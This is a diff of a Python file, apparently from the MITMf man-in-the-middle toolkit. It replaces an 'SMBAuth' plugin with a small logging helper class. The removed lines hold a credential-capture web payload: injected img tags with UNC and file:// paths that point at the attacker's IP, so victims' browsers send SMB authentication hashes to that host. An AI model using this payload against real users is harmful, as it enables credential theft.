@@ -1,4 +1,5 @@
-#!/usr/bin/env python2.7
+#! /usr/bin/env python2.7
+# -*- coding: utf-8 -*-
 
 # Copyright (c) 2014-2016 Marcello Salvati
 #
@@ -18,24 +19,28 @@
 # USA
 #
 
-from core.utils import SystemConfig
-from plugins.plugin import Plugin
-from plugins.Inject import Inject
+import logging
+import sys
 
-class SMBAuth(Inject, Plugin):
-    name     = "SMBAuth"
-    optname  = "smbauth"
-    desc     = "Evoke SMB challenge-response auth attempts"
-    version  = "0.1"
-    has_opts = False
 
-    def initialize(self, options):
-        self.target_ip = SystemConfig.getIP(options.interface)
+class logger:
 
-        Inject.initialize(self, options)
-        self.html_payload = self._get_data()
+    log_level = None
+    __shared_state = {}
 
-    def _get_data(self):
-        return '<img src=\"\\\\%s\\image.jpg\">'\
-                '<img src=\"file://///%s\\image.jpg\">'\
-                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
+    def __init__(self):
+        self.__dict__ = self.__shared_state
+
+    def setup_logger(self, name, formatter, logfile='./logs/mitmf.log'):
+        fileHandler = logging.FileHandler(logfile)
+        fileHandler.setFormatter(formatter)
+        streamHandler = logging.StreamHandler(sys.stdout)
+        streamHandler.setFormatter(formatter)
+
+        logger = logging.getLogger(name)
+        logger.propagate = False
+        logger.addHandler(streamHandler)
+        logger.addHandler(fileHandler)
+        logger.setLevel(self.log_level)
+
+        return logger
